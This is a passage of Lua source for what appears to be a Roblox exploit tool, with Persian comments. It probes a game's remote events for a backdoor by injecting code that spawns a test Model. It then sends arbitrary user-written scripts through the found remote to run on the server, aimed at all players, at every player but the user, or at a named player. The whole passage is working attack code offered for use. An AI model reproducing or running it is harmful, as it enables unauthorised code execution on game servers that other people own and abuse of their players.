									inst:InvokeServer("d = Instance.new('Model') d.Parent = game:GetService('Workspace') d.Name = '"..testingname.."'")
								end
							end)
							
							if successTest then
								local foundObj = Workspace:WaitForChild(testingname, 3)
								if foundObj then
									if not backdoorFound then
										backdoorFound = true
										if getgenv then
											getgenv().SelectedRemote = inst
										else
											_G.SelectedRemote = inst
										end
										notify("Injected!")
										pcall(function()
											foundObj:Destroy()
										end)
									end
								end
							end
						end)
					end
				end
			end
		end
		
		task.wait(4.5)
		if not backdoorFound then
			notify("backdoor not found")
		end
	end)
end)

-- دکمه Execute (همراه با پشتیبانی هوشمند از All، Others و پلیرهای مختلف)
ExecuteBtn.MouseButton1Click:Connect(function()
	local remote = (getgenv and getgenv().SelectedRemote) or _G.SelectedRemote
	if not remote then
		notify("Error: Not Injected / No Remote Found!")
		return
	end
	
	local codeTemplate = TextBox.Text
	if codeTemplate == "-- Enter Script Here..." or codeTemplate == "" then
		notify("Error: Enter or select a script!")
		return
	end
	
	local successCount = 0
	
	if selectedTargetMode == "All" then
		for _, plr in ipairs(Players:GetPlayers()) do
			local finalCode = string.gsub(codeTemplate, "C00LH4CK1124", plr.Name)
			local success = pcall(function()
				if remote.ClassName == "RemoteEvent" then
					remote:FireServer(finalCode)
				elseif remote.ClassName == "RemoteFunction" then
					remote:InvokeServer(finalCode)
				end
			end)
			if success then successCount = successCount + 1 end
		end
		notify("Executed for All (" .. successCount .. " players)")
		
	elseif selectedTargetMode == "Others" then
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= LocalPlayer then
				local finalCode = string.gsub(codeTemplate, "C00LH4CK1124", plr.Name)
				local success = pcall(function()
					if remote.ClassName == "RemoteEvent" then
						remote:FireServer(finalCode)
					elseif remote.ClassName == "RemoteFunction" then
						remote:InvokeServer(finalCode)
					end
				end)
				if success then successCount = successCount + 1 end
			end
		end
		notify("Executed for Others (" .. successCount .. " players)")
		
	else
		-- برای یک پلیر خاص
		local finalCode = string.gsub(codeTemplate, "C00LH4CK1124", selectedTargetMode)
		local success = pcall(function()
			if remote.ClassName == "RemoteEvent" then
				remote:FireServer(finalCode)
			elseif remote.ClassName == "RemoteFunction" then
				remote:InvokeServer(finalCode)
			end
		end)
		
		if success then
			notify("Executed for " .. selectedTargetMode .. "!")
		else
			notify("Execution Failed!")
		end
	end
end)
